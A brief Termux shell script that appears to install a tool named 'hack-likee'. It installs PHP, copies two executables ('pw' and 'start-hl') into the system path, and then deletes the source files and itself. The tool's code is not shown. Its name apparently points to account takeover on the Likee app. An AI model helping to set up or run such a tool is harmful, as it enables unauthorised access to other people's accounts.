clear
sleep 1.0
pkg install php -y
cd $HOME/hack-likee
mv pw /data/data/com.termux/files/usr/bin
mv start-hl /data/data/com.termux/files/usr/bin
cd /data/data/com.termux/files/usr/bin
chmod +x pw
chmod +x start-hl
cd $HOME/hack-likee
rm pw
rm start-hl
rm setup.sh
